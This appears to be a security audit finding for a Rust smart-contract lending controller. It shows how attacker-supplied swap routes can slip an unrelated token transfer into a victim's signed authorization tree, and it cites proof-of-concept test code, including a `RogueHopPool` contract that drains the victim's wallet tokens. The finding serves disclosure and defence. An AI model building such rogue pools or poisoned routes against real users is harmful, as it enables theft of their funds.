### Title
Attacker-controlled swap routes can poison a victim’s authorization tree and drain unrelated wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral` accepts opaque caller-supplied route bytes and forwards them to the configured router while the account owner’s authorization is active [1](#0-0) . The controller narrowly authorizes only its own exact input transfer, but it does not constrain route-selected code that runs below the router call [2](#0-1) . A malicious route can therefore cause an unrelated token transfer from the victim to be recorded as an additional child of the victim’s signed authorization tree [3](#0-2) .

### Finding Description
The vulnerable path is `controller::swap_collateral(caller, account_id, current, amount, new, swap)`: the caller supplies `swap`, the controller withdraws `current`, calls the router, measures output, and redeposits it [4](#0-3) . `swap_tokens` validates the amount and checks the controller’s input/output deltas, but neither check restricts external contracts named inside the opaque route [5](#0-4) .

This is analogous to trusting an attacker-controlled Host header to construct a sensitive URL: the route is attacker-controlled metadata interpreted inside a security-sensitive authorization context. The harness demonstrates a route-selected contract calling `token.transfer(victim, attacker, amount)` during an otherwise successful collateral swap [6](#0-5) . Simulation records that unauthorized-looking transfer as a child beneath the victim’s `swap_collateral` authorization, and signing the poisoned tree makes the transfer succeed [7](#0-6) .

### Impact Explanation
An attacker can steal wallet tokens unrelated to the lending markets and outside the routed input amount, provided the victim signs the simulation-produced authorization tree [8](#0-7) . The protocol’s measured-output and solvency checks can still pass because the stolen token is neither the router input nor the collateral output [5](#0-4) . This is theft of user funds rather than merely a bad exchange rate.

### Likelihood Explanation
The attacker needs to supply or induce use of a malicious route and have the victim sign the resulting authorization tree; without that extra signed child, the host rejects the transfer and rolls back the call [9](#0-8) . This matches the phishing character of the source advisory: a forged route presented as a valid quote can produce a valid-looking signed transaction while embedding an unexpected transfer [10](#0-9) .

### Recommendation
Governance should restrict router venue/pool addresses to an approved allowlist rather than permitting arbitrary route-selected contract addresses. Clients should also decode `swap` and reject any simulated authorization tree containing children other than the expected input-token transfer; the signed poisoned tree is the exact condition that enables the theft [7](#0-6) .

### Proof of Concept
The repository’s `rogue_hop_pool_transfer_joins_caller_auth_tree` test deploys a route-selected `RogueHopPool` whose `swap` method transfers an unrelated token from Alice to the attacker [6](#0-5) . In recording mode, `swap_collateral` completes and simulation records the rogue `transfer(alice, attacker, WALLET_BALANCE)` beneath Alice’s root authorization [11](#0-10) . In enforcing mode, the same route fails without that child and succeeds once the victim signs the poisoned tree, leaving Alice with zero wallet tokens and the attacker with `WALLET_BALANCE` [12](#0-11) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L27-47)
```rust
pub(crate) fn process_swap_collateral(
    env: &Env,
    caller: &Address,
    params: SwapCollateralParams<'_>,
) {
    let SwapCollateralParams {
        account_id,
        current,
        from_amount,
        new,
        swap,
    } = params;

    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-76)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );

    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-226)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
